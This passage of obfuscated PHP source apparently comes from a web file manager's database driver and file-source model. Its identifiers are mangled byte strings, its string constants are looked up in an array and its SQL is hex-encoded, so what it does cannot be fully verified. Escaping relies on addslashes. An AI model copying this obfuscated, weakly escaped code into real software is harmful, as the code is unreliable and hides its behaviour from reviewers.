"\x53\x45\x4c\105\x43\124\x20\x20\x20\x63\157\154\x75\155\x6e\137\156\141\x6d\x65\40\141\x73\x20\47\x4e\141\155\x65\47\54\x20\40\x20\x64\x61\x74\141\x5f\x74\x79\x70\x65\x20\141\x73\40\47\x54\171\160\x65\x27\x2c\40\x20\40\143\157\x6c\165\155\156\x5f\x64\145\x66\x61\x75\x6c\164\x20\141\x73\x20\47\x44\x65\x66\x61\165\154\164\47\x2c\40\40\40\x69\x73\137\156\165\x6c\x6c\x61\x62\x6c\145\x20\141\x73\x20\x27\116\x75\x6c\154\47\xa\11\x9\x46\x52\117\115\11\x69\156\x66\157\162\155\141\164\151\x6f\x6e\x5f\x73\143\150\145\155\141\56\x74\141\x62\154\x65\x73\40\x41\x53\x20\164\12\11\11\x4a\117\x49\116\x9\151\x6e\x66\157\162\155\141\164\151\x6f\156\137\x73\143\150\145\155\141\56\x63\157\154\x75\155\x6e\163\40\101\123\x20\143\12\x9\x9\117\116\x20\40\164\56\x74\x61\142\x6c\145\137\143\x61\x74\141\x6c\x6f\147\x20\x3d\x20\x63\x2e\164\141\x62\154\145\137\x63\141\164\141\x6c\157\x67\xa\x9\x9\101\x4e\104\x20\164\x2e\164\141\x62\x6c\x65\x5f\163\x63\x68\x65\x6d\x61\x20\75\x20\143\x2e\164\141\142\154\x65\137\x73\x63\x68\145\155\141\xa\x9\11\101\116\x44\x20\x74\56\x74\141\142\x6c\x65\137\156\141\x6d\145\40\x3d\x20\x63\56\164\x61\x62\154\x65\x5f\x6e\141\155\145\xa\x9\x9\127\110\x45\x52\105\40\40\x20\164\x2e\164\141\142\154\x65\137\156\141\x6d\145\40\75\40\x27{$ä…§Ì½¿}\47"; break; case $Ù«éœ[1032]: $¹ôşê¯¶ = $Ù«éœ[1033] . $ä…§Ì½¿ . $Ù«éœ[1034]; break; case $Ù«éœ[1014]: case $Ù«éœ[1016]: $¹ôşê¯¶ = $Ù«éœ[1035] . $Ù«éœ[1036] . $Ù«éœ[1037] . strtoupper($ä…§Ì½¿) . $Ù«éœ[1038] . strtoupper($ä…§Ì½¿) . $Ù«éœ[1039]; break; case $Ù«éœ[1040]: $¹ôşê¯¶ = $Ù«éœ[1041] . $ä…§Ì½¿ . $Ù«éœ[1042]; break; case $Ù«éœ[1015]: break; case $Ù«éœ[1043]: default: $¹ôşê¯¶ = $Ù«éœ[1044] . ($this->dbType == $Ù«éœ[1043] ? "\x60{$ä…§Ì½¿}\x60" : $ä…§Ì½¿); } } $›Ø–ŠÊò = $this->query($¹ôşê¯¶); $Âòı¸¢” = array(); if ($›Ø–ŠÊò) { foreach ($›Ø–ŠÊò as $£ª¦çà => $ïà‚ˆ”Ÿ) { $ïà‚ˆ”Ÿ = array_change_key_case($ïà‚ˆ”Ÿ); $ïà‚ˆ”Ÿ[$Ù«éœ[32]] = isset($ïà‚ˆ”Ÿ[$Ù«éœ[32]]) ? $ïà‚ˆ”Ÿ[$Ù«éœ[32]] : $Ù«éœ[456]; $ïà‚ˆ”Ÿ[$Ù«éœ[33]] = isset($ïà‚ˆ”Ÿ[$Ù«éœ[33]]) ? $ïà‚ˆ”Ÿ[$Ù«éœ[33]] : $Ù«éœ[456]; $¬„È¡Á = isset($ïà‚ˆ”Ÿ[$Ù«éœ[353]]) ? $ïà‚ˆ”Ÿ[$Ù«éœ[353]] : $ïà‚ˆ”Ÿ[$Ù«éœ[32]]; $Âòı¸¢”[$¬„È¡Á] = array($Ù«éœ[32] => $¬„È¡Á, $Ù«éœ[33] => $ïà‚ˆ”Ÿ[$Ù«éœ[33]], $Ù«éœ[35] => (bool) (isset($ïà‚ˆ”Ÿ[$Ù«éœ[106]]) && $ïà‚ˆ”Ÿ[$Ù«éœ[106]] === $Ù«éœ[12] || isset($ïà‚ˆ”Ÿ[$Ù«éœ[35]]) && $ïà‚ˆ”Ÿ[$Ù«éœ[35]] === $Ù«éœ[12]), $Ù«éœ[37] => isset($ïà‚ˆ”Ÿ[$Ù«éœ[37]]) ? $ïà‚ˆ”Ÿ[$Ù«éœ[37]] : (isset($ïà‚ˆ”Ÿ[$Ù«éœ[56]]) ? $ïà‚ˆ”Ÿ[$Ù«éœ[56]] : $Ù«éœ[456]), $Ù«éœ[39] => isset($ïà‚ˆ”Ÿ[$Ù«éœ[97]]) ? strtolower($ïà‚ˆ”Ÿ[$Ù«éœ[97]]) == $Ù«éœ[41] : (isset($ïà‚ˆ”Ÿ[$Ù«éœ[57]]) ? $ïà‚ˆ”Ÿ[$Ù«éœ[57]] : !1), $Ù«éœ[42] => isset($ïà‚ˆ”Ÿ[$Ù«éœ[1045]]) ? strtolower($ïà‚ˆ”Ÿ[$Ù«éœ[1045]]) == $Ù«éœ[44] : (isset($ïà‚ˆ”Ÿ[$Ù«éœ[97]]) ? $ïà‚ˆ”Ÿ[$Ù«éœ[97]] : !1)); } } return $Âòı¸¢”; } public function getTables($‚®‘Œ¥ = '') { $Æ‘¡Êïé =& $_SERVER[¯‘·½]; if (think_config($Æ‘¡Êïé[1046])) { $ÛêÁş¶¾ = str_replace($Æ‘¡Êïé[1047], $‚®‘Œ¥, think_config($Æ‘¡Êïé[1046])); } else { switch ($this->dbType) { case $Æ‘¡Êïé[1014]: case $Æ‘¡Êïé[1016]: $ÛêÁş¶¾ = $Æ‘¡Êïé[1048]; break; case $Æ‘¡Êïé[1013]: case $Æ‘¡Êïé[1031]: $ÛêÁş¶¾ = $Æ‘¡Êïé[1049]; break; case $Æ‘¡Êïé[1040]: $ÛêÁş¶¾ = $Æ‘¡Êïé[1050]; break; case $Æ‘¡Êïé[1015]: think_exception(think_lang($Æ‘¡Êïé[1051]) . $Æ‘¡Êïé[1052]); break; case $Æ‘¡Êïé[1032]: $ÛêÁş¶¾ = $Æ‘¡Êïé[45] . $Æ‘¡Êïé[46] . $Æ‘¡Êïé[47]; break; case $Æ‘¡Êïé[1043]: default: if (!empty($‚®‘Œ¥)) { $ÛêÁş¶¾ = $Æ‘¡Êïé[995] . $‚®‘Œ¥ . $Æ‘¡Êïé[996]; } else { $ÛêÁş¶¾ = $Æ‘¡Êïé[997]; } } } $¯àÉ½»â = $this->query($ÛêÁş¶¾); $¾ú„‹ÚÌ = array(); foreach ($¯àÉ½»â as $†»ßº¹ => $âùĞ™ØŒ) { $¾ú„‹ÚÌ[$†»ßº¹] = current($âùĞ™ØŒ); } return $¾ú„‹ÚÌ; } protected function parseLimit($­Şİ×ûå) { $“é•ìşš =& $_SERVER[¯‘·½]; $×ÓŞó™ª = $“é•ìşš[12]; if (!empty($­Şİ×ûå)) { switch ($this->dbType) { case $“é•ìşš[1040]: case $“é•ìşš[1032]: $­Şİ×ûå = explode($“é•ìşš[50], $­Şİ×ûå); if (count($­Şİ×ûå) > 1) { $×ÓŞó™ª .= $“é•ìşš[51] . $­Şİ×ûå[1] . $“é•ìşš[52] . $­Şİ×ûå[0] . $“é•ìşš[53]; } else { $×ÓŞó™ª .= $“é•ìşš[51] . $­Şİ×ûå[0] . $“é•ìşš[53]; } break; case $“é•ìşš[1013]: case $“é•ìşš[1031]: break; case $“é•ìşš[1015]: break; case $“é•ìşš[1014]: case $“é•ìşš[1016]: break; case $“é•ìşš[1043]: default: $×ÓŞó™ª .= $“é•ìşš[51] . $­Şİ×ûå . $“é•ìşš[53]; } } return $×ÓŞó™ª; } public function parseKey(&$—²º´Üâ, $Ÿ¾ë¦«Ë = true) { $å£¡ç© =& $_SERVER[¯‘·½]; if ($Ÿ¾ë¦«Ë) { $—²º´Üâ = $this->parseKeyCheck($—²º´Üâ); } if ($this->dbType == $å£¡ç©[1043]) { if ($—²º´Üâ != $å£¡ç©[223] && !preg_match($å£¡ç©[1007], $—²º´Üâ)) { $—²º´Üâ = $å£¡ç©[463] . trim($—²º´Üâ, $å£¡ç©[463]) . $å£¡ç©[463]; } return $—²º´Üâ; } else { return parent::parseKey($—²º´Üâ, $Ÿ¾ë¦«Ë); } } public function close() { $this->_linkID = null; } public function error() { $äæÀä•“ =& $_SERVER[¯‘·½]; if ($this->PDOStatement) { $·Ù‚¦ˆ = $this->PDOStatement->errorInfo(); $this->error = $·Ù‚¦ˆ[1] . $äæÀä•“[4] . $·Ù‚¦ˆ[2]; } else { $this->error = $äæÀä•“[12]; } if ($äæÀä•“[12] != $this->queryStr) { $this->error .= LNG($äæÀä•“[48]) . $this->queryStr; } think_trace($this->error, $äæÀä•“[12], $äæÀä•“[49]); return $this->error; } public function escapeString($´ŸÈŸ’) { $ş¦Ù¿¨Œ =& $_SERVER[¯‘·½]; switch ($this->dbType) { case $ş¦Ù¿¨Œ[1040]: case $ş¦Ù¿¨Œ[1013]: case $ş¦Ù¿¨Œ[1031]: case $ş¦Ù¿¨Œ[1043]: return addslashes($´ŸÈŸ’); case $ş¦Ù¿¨Œ[1015]: case $ş¦Ù¿¨Œ[1032]: case $ş¦Ù¿¨Œ[1014]: case $ş¦Ù¿¨Œ[1016]: return str_ireplace($ş¦Ù¿¨Œ[58], $ş¦Ù¿¨Œ[59], $´ŸÈŸ’); } } protected function parseValue($ĞœêÕĞñ) { $¡–ğÜ÷ü =& $_SERVER[¯‘·½]; if (is_string($ĞœêÕĞñ)) { $áú°âúš = strpos($ĞœêÕĞñ, $¡–ğÜ÷ü[4]) === 0 && in_array($ĞœêÕĞñ, array_keys($this->bind)); $ĞœêÕĞñ = $áú°âúš ? $this->escapeString($ĞœêÕĞñ) : $¡–ğÜ÷ü[1053] . $this->escapeString($ĞœêÕĞñ) . $¡–ğÜ÷ü[1053]; } elseif (isset($ĞœêÕĞñ[0]) && is_string($ĞœêÕĞñ[0]) && strtolower($ĞœêÕĞñ[0]) == $¡–ğÜ÷ü[374]) { $ĞœêÕĞñ = $this->escapeString($ĞœêÕĞñ[1]); } elseif (is_array($ĞœêÕĞñ)) { $ĞœêÕĞñ = array_map(array($this, $¡–ğÜ÷ü[1054]), $ĞœêÕĞñ); } elseif (is_bool($ĞœêÕĞñ)) { $ĞœêÕĞñ = $ĞœêÕĞñ ? $¡–ğÜ÷ü[91] : $¡–ğÜ÷ü[231]; } elseif (is_null($ĞœêÕĞñ)) { $ĞœêÕĞñ = $¡–ğÜ÷ü[106]; } return $ĞœêÕĞñ; } public function getLastInsertId() { $¶÷Ëóº… =& $_SERVER[¯‘·½]; switch ($this->dbType) { case $¶÷Ëóº…[1040]: case $¶÷Ëóº…[1032]: case $¶÷Ëóº…[1013]: case $¶÷Ëóº…[1031]: case $¶÷Ëóº…[1015]: case $¶÷Ëóº…[1043]: return $this->_linkID->lastInsertId(); case $¶÷Ëóº…[1014]: case $¶÷Ëóº…[1016]: $˜å¾×Ä = $this->table; $¿ü­¡†¨ = $this->query("\123\x45\x4c\105\103\x54\x20{$˜å¾×Ä}\x2e\143\165\x72\162\x76\141\x6c\x20\143\165\x72\x72\x76\141\x6c\x20\106\122\117\x4d\40\144\165\x61\154"); return $¿ü­¡†¨ ? $¿ü­¡†¨[0][$¶÷Ëóº…[1055]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($ıÕùˆ‹õ) { $ô°îè© =& $_SERVER[¯‘·½]; if (!CacheLock::fileLock($ô°îè©[13])) { return !1; } $½Èåšù£ = parent::query($ıÕùˆ‹õ); CacheLock::fileUnLock($ô°îè©[13]); return $½Èåšù£; } public function execute($¼ßĞ¦Á‰) { $©°ñ»óâ =& $_SERVER[¯‘·½]; if (!CacheLock::fileLock($©°ñ»óâ[13])) { return !1; } $”Ç¹ÂÈ = parent::execute($¼ßĞ¦Á‰); CacheLock::fileUnLock($©°ñ»óâ[13]); return $”Ç¹ÂÈ; } } class DbSqlite3 extends DbSqlite3Base { public function query($°ÖğÑ›š) { $‚øÄÈĞ¯ =& $_SERVER[¯‘·½]; if (!CacheLock::fileLock($‚øÄÈĞ¯[13])) { return !1; } $İ¸„µØÏ = parent::query($°ÖğÑ›š); CacheLock::fileUnLock($‚øÄÈĞ¯[13]); return $İ¸„µØÏ; } public function execute($ï‚Îâİ‚) { $èôíŸ×  =& $_SERVER[¯‘·½]; if (!CacheLock::fileLock($èôíŸ× [13])) { return !1; } $ÛµÊĞÛ¨ = parent::execute($ï‚Îâİ‚); CacheLock::fileUnLock($èôíŸ× [13]); return $ÛµÊĞÛ¨; } } goto D„‘íÙ”°†; díÅÚ§ñœÒ: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($Ö«‹µÎÂ) { $®†ûÆÛ =& $_SERVER[¯‘·½]; $ê‘¨÷‘ = Model($®†ûÆÛ[581])->where(array($®†ûÆÛ[1797] => $Ö«‹µÎÂ))->find(); $ˆŞşû¢È = $this->_mkdirRoot(SourceModel::TYPE_USER, $Ö«‹µÎÂ, $ê‘¨÷‘[$®†ûÆÛ[32]]); $this->userDesktopAdd($ˆŞşû¢È); return $ˆŞşû¢È; } public function userDesktopAdd($«óŸßŞË) { $ôİÂ«£ =& $_SERVER[¯‘·½]; $êÚ‚ò™“ = LNG($ôİÂ«£[2292]); $Ãİï’¦Ö = $this->mkdir($«óŸßŞË, $êÚ‚ò™“); $this->metaSet($Ãİï’¦Ö, $ôİÂ«£[2293], $ôİÂ«£[91]); $this->metaSet($«óŸßŞË, $ôİÂ«£[2294], $Ãİï’¦Ö); } public function userPathSafeAdd($’ĞñŸ¡·) { $…­ğÓ…Á =& $_SERVER[¯‘·½]; $çíİĞë = Model($…­ğÓ…Á[581])->getInfoFull($’ĞñŸ¡·); if (!$çíİĞë) { return !1; } if (_get($çíİĞë, $…­ğÓ…Á[602])) { return $çíİĞë[$…­ğÓ…Á[543]][$…­ğÓ…Á[2295]]; } $‰ä¬şÜµ = $this->_mkdirRoot(SourceModel::TYPE_USER, $’ĞñŸ¡·, $…­ğÓ…Á[2296], $…­ğÓ…Á[2297]); Model($…­ğÓ…Á[581])->metaSet($’ĞñŸ¡·, $…­ğÓ…Á[2295], $‰ä¬şÜµ); $this->metaSet($‰ä¬şÜµ, $…­ğÓ…Á[2298], $’ĞñŸ¡·); return $‰ä¬şÜµ; } public function userPathAppAdd($µßÉ€µ¡, $—¡ìŸ¦Í = '', $¢ùâïÆÚ = '') { $íœÍêüö =& $_SERVER[¯‘·½]; $°ö€›Ã = Model($íœÍêüö[581])->getInfoFull($µßÉ€µ¡); if (!$°ö€›Ã) { return !1; } $¦à†Í›© = $°ö€›Ã[$íœÍêüö[543]] ? $°ö€›Ã[$íœÍêüö[543]] : array(); $ş“Ñ­Üã = $¦à†Í›©[$íœÍêüö[2299]]; if (!$ş“Ñ­Üã) { $ş“Ñ­Üã = $this->_mkdirRoot(SourceModel::TYPE_USER, $µßÉ€µ¡, $íœÍêüö[2300], $íœÍêüö[2301]); Model($íœÍêüö[581])->metaSet($µßÉ€µ¡, $íœÍêüö[2299], $ş“Ñ­Üã . $íœÍêüö[12]); $this->metaSet($ş“Ñ­Üã, $íœÍêüö[2299], $µßÉ€µ¡); } if (!$—¡ìŸ¦Í) { return $ş“Ñ­Üã; } $˜„ä ²Ô = $¦à†Í›©[$íœÍêüö[2302] . $—¡ìŸ¦Í]; if (!$˜„ä ²Ô) { $˜„ä ²Ô = $this->mkdir($ş“Ñ­Üã, $—¡ìŸ¦Í); Model($íœÍêüö[581])->metaSet($µßÉ€µ¡, $íœÍêüö[2302] . $—¡ìŸ¦Í, $˜„ä ²Ô); $this->metaSet($˜„ä ²Ô, $íœÍêüö[2302] . $—¡ìŸ¦Í, $µßÉ€µ¡); } if (!$¢ùâïÆÚ) { return $˜„ä ²Ô; } $ÉÙõ¯° = $this->mkdir($˜„ä ²Ô, $¢ùâïÆÚ); return $ÉÙõ¯°; } public function groupRootAdd($Á®ú€) { $ÑÎÒ€çé =& $_SERVER[¯‘·½]; $•«Ü—ú = Model($ÑÎÒ€çé[589])->where(array($ÑÎÒ€çé[2096] => $Á®ú€))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $Á®ú€, $•«Ü—ú[$ÑÎÒ€çé[32]]); } public function systemRootPathAdd($ÔíÂØ¾ö) { if ($ÔíÂØ¾ö != $_SERVER[¯‘·½][612]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $ÔíÂØ¾ö); } public function userRootRemove($»‡úå×¢) { $½ãóø = $this->targetSourceRoot(SourceModel::TYPE_USER, $»‡úå×¢, !0); foreach ($½ãóø as $óÁáüğ›) { if (!$óÁáüğ›) { continue; } $this->remove($óÁáüğ›[$_SERVER[¯‘·½][194]], !1); } } public function groupRootRemove($»¹¶íÇ¢) { $†¶Ùì›Ç = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $»¹¶íÇ¢); if (!$†¶Ùì›Ç) { return; } $this->remove($†¶Ùì›Ç[$_SERVER[¯‘·½][194]], !1); } private function _mkdirRoot($ôæç¯áú, $Ì‚íåáâ, $Ôéœ•¦, $†“œåÆ¨ = '') { $ŠÖÇüÑñ =& $_SERVER[¯‘·½]; $ÛØ¥ÔÀ” = defined($ŠÖÇüÑñ[2237]) ? USER_ID : 0; $Ë¡ãÂú½ = array($ŠÖÇüÑñ[479] => 0, $ŠÖÇüÑñ[655] => $ôæç¯áú, $ŠÖÇüÑñ[656] => $Ì‚íåáâ, $ŠÖÇüÑñ[653] => 1, $ŠÖÇüÑñ[657] => $ÛØ¥ÔÀ”, $ŠÖÇüÑñ[658] => $ÛØ¥ÔÀ”, $ŠÖÇüÑñ[654] => $†“œåÆ¨, $ŠÖÇüÑñ[659] => $ŠÖÇüÑñ[597], $ŠÖÇüÑñ[506] => 0, $ŠÖÇüÑñ[624] => 0, $ŠÖÇüÑñ[546] => 0, $ŠÖÇüÑñ[660] => $ŠÖÇüÑñ[12]); if ($üöšõ¹ô = $this->where($Ë¡ãÂú½)->find()) { return $üöšõ¹ô[$ŠÖÇüÑñ[194]]; } $ÌùÂõƒ = "\x4d\x6f\x64\145\154\123\x6f\165\162\143\145\56\x6d\x6b\x64\151\x72\122\157\157\164\56{$ôæç¯áú}\x2e{$Ì‚íåáâ}\56" . $Ôéœ•¦; CacheLock::lock($ÌùÂõƒ); $Ë¡ãÂú½[$ŠÖÇüÑñ[32]] = $Ôéœ•¦; $ò·õñ« = $this->add($Ë¡ãÂú½); $­ùôŒí‚ = array($ŠÖÇüÑñ[661] => short_id($ò·õñ«)); $this->where(array($ŠÖÇüÑñ[493] => $ò·õñ«))->save($­ùôŒí‚); CacheLock::unlock($ÌùÂõƒ); return $ò·õñ«; } private function targetSourceRoot($‰êØÂÎ, $ıÅºû‘, $®Ô×¼Ğê = false) { $‘ÒµŒÉ– =& $_SERVER[¯‘·½]; $¿ííäõ– = array($‘ÒµŒÉ–[479] => 0, $‘ÒµŒÉ–[655] => $‰êØÂÎ, $‘ÒµŒÉ–[656] => $ıÅºû‘); if ($®Ô×¼Ğê) { $ÉÀ©Š–Å = $this->where($¿ííäõ–)->select(); return $ÉÀ©Š–Å ? $ÉÀ©Š–Å : array(); } $¿ÀÔÓ­ö = $this->where($¿ííäõ–)->find(); return $¿ÀÔÓ­ö ? $¿ÀÔÓ­ö : array(); } public function sourceRootGroup($ŞÒ©ÚçÒ) { $¦“Ò”ä =& $_SERVER[¯‘·½]; if (is_string($ŞÒ©ÚçÒ)) { $ŞÒ©ÚçÒ = array($ŞÒ©ÚçÒ); } $á³—¨Šú = $this->listSourceRoot(SourceModel::TYPE_GROUP, $ŞÒ©ÚçÒ, $¦“Ò”ä[223]); $»“Ğ®Öô = array($¦“Ò”ä[447] => $á³—¨Šú, $¦“Ò”ä[444] => array($¦“Ò”ä[844] => count($ŞÒ©ÚçÒ))); $this->_listDataApply($»“Ğ®Öô[$¦“Ò”ä[447]]); $this->_listMake($»“Ğ®Öô); return array_to_keyvalue($»“Ğ®Öô[$¦“Ò”ä[85]], $¦“Ò”ä[573]); } public function mkfile($¿­œÉ¬, $¡««…¢¼, $†¼²×‚­ = '', $ßÆ‘¢„ = REPEAT_RENAME) { $ñ¥“¼ŸÏ =& $_SERVER[¯‘·½]; $øáÉ‘â = KodIO::ioFileDriverGet($ñ¥“¼ŸÏ[485] . $¿­œÉ¬ . $ñ¥“¼ŸÏ[404]); $™†’ê® = Model($ñ¥“¼ŸÏ[681])->addFileByContent($†¼²×‚­, $øáÉ‘â, $¡««…¢¼); return $this->_createFileCall($¿­œÉ¬, $¡««…¢¼, $™†’ê®, $ßÆ‘¢„, $ñ¥“¼ŸÏ[1462]); } public function addFile($˜œ·ıİ, $—’óÜ™É, $ëÜÎº¯¢, $›ãàÛÎë = false, $øö¹¢óİ = REPEAT_RENAME) { $·Ë Ùî® =& $_SERVER[¯‘·½]; $ã¢¤Í = KodIO::ioFileDriverGet($·Ë Ùî®[485] . $˜œ·ıİ . $·Ë Ùî®[404]); $ãÉ¤ø¶ = Model($·Ë Ùî®[681])->addFile($—’óÜ™É, $ã¢¤Í, $ëÜÎº¯¢, $›ãàÛÎë); return $this->_createFileCall($˜œ·ıİ, $ëÜÎº¯¢, $ãÉ¤ø¶, $øö¹¢óİ); } public function addFileByFileID($½—êùİ, $ù®‘‰Ïø, $¡³¡Úá°, $ı˜‚È¼¦ = REPEAT_RENAME) { $Ñß³ˆ®¦ =& $_SERVER[¯‘·½]; $ö¸éÔ± = Model($Ñß³ˆ®¦[681])->find($ù®‘‰Ïø); Model($Ñß³ˆ®¦[681])->linkAdd($ù®‘‰Ïø); return $this->_createFileCall($½—êùİ, $¡³¡Úá°, $ö¸éÔ±, $ı˜‚È¼¦); } public function addFileByRemote($ÂïøÁœ¶, $†÷ŒÖ­Ò, $™µÙß×, $à¥ğ—±ü = array(), $Ş’±É­  = REPEAT_RENAME) { $ê¦¿‚Ô = Model($_SERVER[¯‘·½][681])->addFileByRemote($†÷ŒÖ­Ò, $™µÙß×, $à¥ğ—±ü); return $this->_createFileCall($ÂïøÁœ¶, $™µÙß×, $ê¦¿‚Ô, $Ş’±É­ ); } private function _createFileCall($ëÁö´ùç, $ïÖÜ¥í, $â”‰Í•´, $ê‡ç©Ş, $¸ÈÁ©¹‰ = "\x75\160\154\x6f\x61\144") { $×ºèÇÒ =& $_SERVER[¯‘·½]; if (!$â”‰Í•´) { return !1; } $ÕÄ‘ ¡ = !1; $this->setMasterDB(); $this->lockWriteStart($ëÁö´ùç, $ïÖÜ¥í); $÷‰¿¾û = $this->fileNameExist($ëÁö´ùç, $ïÖÜ¥í); $×©¶÷Š· = $this->_createFile($ëÁö´ùç, $ïÖÜ¥í, $â”‰Í•´, $ê‡ç©Ş, $ÕÄ‘ ¡); if (!$ÕÄ‘ ¡) { Model($×ºèÇÒ[548])->remove($â”‰Í•´[$×ºèÇÒ[545]]); } if ($ÕÄ‘ ¡ && $×©¶÷Š· && $×©¶÷Š· != $÷‰¿¾û) { Model($×ºèÇÒ[2264])->eventCreate($×©¶÷Š·, $¸ÈÁ©¹‰); } $this->lockWriteEnd($ëÁö´ùç, $ïÖÜ¥í); return $×©¶÷Š·; } public function mkdir($©­Ú÷Ù¤, $õ¯Óë«, $òÃ¾êºû = REPEAT_SKIP) { $Ÿ§Ùòşë =& $_SERVER[¯‘·½]; $this->setMasterDB(); $Úíïä = $this->sourceInfo($©­Ú÷Ù¤); if (!$Úíïä) { return !1; } $this->lockWriteStart($©­Ú÷Ù¤, $õ¯Óë«); if ($òÃ¾êºû !== !1) { $ÊñÇÌ†• = $this->fileNameExist($©­Ú÷Ù¤, $õ¯Óë«); if ($ÊñÇÌ†• && $òÃ¾êºû != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($©­Ú÷Ù¤, $õ¯Óë«); return $ÊñÇÌ†•; } $õ¯Óë« = $this->fileNameAuto($©­Ú÷Ù¤, $õ¯Óë«, $òÃ¾êºû); } $Åáó†· = array($Ÿ§Ùòşë[653] => 1, $Ÿ§Ùòşë[496] => $õ¯Óë«, $Ÿ§Ùòşë[654] => $Ÿ§Ùòşë[12], $Ÿ§Ùòşë[546] => 0, $Ÿ§Ùòşë[624] => 0); $Öã”ö«ò = $this->_addSource($Åáó†·, $Úíïä); Model($Ÿ§Ùòşë[2264])->eventCreate($Öã”ö«ò, $Ÿ§Ùòşë[1463]); $this->lockWriteEnd($©­Ú÷Ù¤, $õ¯Óë«); return $Öã”ö«ò; } public function listSourceRoot($Ú‹ÏœÒ, $ “ëÇ´÷, $ù×Ò£–ë = "\x73\157\165\x72\x63\145\111\x44\x2c\x74\141\162\147\145\x74\x49\x44\x2c\x73\x69\x7a\x65") { $‘•¦ê¸ë =& $_SERVER[¯‘·½]; $Äš­æîÇ = $‘•¦ê¸ë[456]; $ı²†©©¯ = array(); $Ş½„Ç¡û = 1024 * 50; $—³“¿È“ = is_array($—³“¿È“) ? $—³“¿È“ : array(); $ŒÂË‘ë = count($ “ëÇ´÷); $»Û˜ßàÔ = $this->tablePrefix . $‘•¦ê¸ë[2303]; for ($×ïâ¸üØ = 0; $×ïâ¸üØ < $ŒÂË‘ë; $×ïâ¸üØ++) { $–˜ÁˆÍ‰ = $ “ëÇ´÷[$×ïâ¸üØ]; $Äš­æîÇ .= "\123\105\x4c\x45\x43\x54\x20\52\40\106\122\117\115\40\x28\x53\105\114\105\103\124\x20{$ù×Ò£–ë}\40\x46\122\x4f\x4d\x20\140{$»Û˜ßàÔ}\140\40\127\110\x45\x52\105\x20"; $Äš­æîÇ .= "\140\x70\141\162\x65\x6e\164\111\104\x60\75\x30\40\x41\x4e\x44\40\x60\x74\x61\x72\147\145\x74\111\x44\140\x3d{$–˜ÁˆÍ‰}\40\101\x4e\104\x20\140\164\x61\162\x67\x65\164\124\171\160\x65\140\75{$Ú‹ÏœÒ}\x20\x61\156\x64\x20\x66\x69\154\145\124\171\x70\145\75\x27\x27\x20\x6c\151\x6d\x69\164\x20\61\51\40\x61\x73\x20\x74\142\137{$×ïâ¸üØ}\40\x55\116\x49\117\x4e\40\x41\x4c\114\x20"; if ((strlen($Äš­æîÇ) >= $Ş½„Ç¡û || $×ïâ¸üØ == $ŒÂË‘ë - 1) && $Äš­æîÇ) { $Äš­æîÇ = substr($Äš­æîÇ, 0, -strlen($‘•¦ê¸ë[1134])); $ÃŠÁ²àÆ = $this->query($Äš­æîÇ); $Äš­æîÇ = $‘•¦ê¸ë[12]; $ı²†©©¯ = array_merge($ı²†©©¯, $ÃŠÁ²àÆ); } } return $ı²†©©¯; } private function _createFile($âñ‰ƒùë, $¥Öù ¼, $Úôñı»â, $±€¯™„, &$Û»Ğùï›) { $ïıÚé¨ä =& $_SERVER[¯‘·½]; $·†û›é = $this->sourceInfo($âñ‰ƒùë); if (!$Úôñı»â || !$·†û›é) { return !1; } if ($±€¯™„ !== !1) { $©ê§Š»¸ = $this->fileNameExist($âñ‰ƒùë, $¥Öù ¼); } $Û»Ğùï› = !0; if ($±€¯™„ && $©ê§Š»¸) { if ($±€¯™„ == REPEAT_SKIP) { $Û»Ğùï› = !1; return $©ê§Š»¸; } else { if ($±€¯™„ == REPEAT_REPLACE) { $ Ú‘‘ÊÀ = $this->sourceInfo($©ê§Š»¸); $Ø¸­‡ö = $this->fileHistory($ Ú‘‘ÊÀ, $Úôñı»â[$ïıÚé¨ä[545]], $Úôñı»â[$ïıÚé¨ä[79]]); if (!$Ø¸­‡ö) { $Û»Ğùï› = !1; } else { $this->folderSizeReset($âñ‰ƒùë); } return $©ê§Š»¸; } else { $¥Öù ¼ = $this->fileNameAuto($âñ‰ƒùë, $¥Öù ¼, $±€¯™„, !1); } } } $İæ·‰Ìº = array($ïıÚé¨ä[653] => 0, $ïıÚé¨ä[496] => $¥Öù ¼, $ïıÚé¨ä[654] => substr(get_path_ext($¥Öù ¼), 0, 10), $ïıÚé¨ä[546] => $Úôñı»â[$ïıÚé¨ä[545]], $ïıÚé¨ä[624] => $Úôñı»â[$ïıÚé¨ä[79]]); $ÚÄ½”•¤ = $this->_addSource($İæ·‰Ìº, $·†û›é); $this->folderSizeReset($âñ‰ƒùë, intval($İæ·‰Ìº[$ïıÚé¨ä[79]])); return $ÚÄ½”•¤; } protected function fileHistory($Èƒ†¨»¯, $ŠÄ·°ØÛ, $æˆÃÊ…) { $œåºçÜ =& $_SERVER[¯‘·½]; if ($Èƒ†¨»¯[$œåºçÜ[545]] == $ŠÄ·°ØÛ) { return !1; } $this->checkLock($Èƒ†¨»¯[$œåºçÜ[194]], $ŠÄ·°ØÛ); Model($œåºçÜ[2304])->addHistory($Èƒ†¨»¯); $ı¾ÄÃš = array($œåºçÜ[658] => USER_ID, $œåºçÜ[500] => time(), $œåºçÜ[545] => $ŠÄ·°ØÛ, $œåºçÜ[79] => $æˆÃÊ…); $this->where(array($œåºçÜ[493] => $Èƒ†¨»¯[$œåºçÜ[194]]))->save($ı¾ÄÃš); $this->sourceCacheClear($Èƒ†¨»¯[$œåºçÜ[194]]); return !0; } public function checkLock($Ô•Ç†Ê, $´Ş©¯) { $¸ÑŸ» =& $_SERVER[¯‘·½]; $ñĞØúî÷ = $this->pathInfo($Ô•Ç†Ê); if (!$this->fileIsLock($ñĞØúî÷, !0)) { return; } $—ü™åİŸ = Session::get($¸ÑŸ»[2305]); $¦™°Ö’Ï = substr($ñĞØúî÷[$¸ÑŸ»[32]], 0, -1 - strlen($ñĞØúî÷[$¸ÑŸ»[169]])) . $¸ÑŸ»[1317] . $—ü™åİŸ . $¸ÑŸ»[10] . $ñĞØúî÷[$¸ÑŸ»[169]]; $¬¬¯¯ùÖ = Model($¸ÑŸ»[681])->find($´Ş©¯); $this->_createFileCall($ñĞØúî÷[$¸ÑŸ»[193]], $¦™°Ö’Ï, $¬¬¯¯ùÖ, REPEAT_REPLACE, $¸ÑŸ»[1462]); $Ûùöş¡¡ = $ñĞØúî÷[$¸ÑŸ»[543]][$¸ÑŸ»[617]]; $ÌÉÂ–€ç = 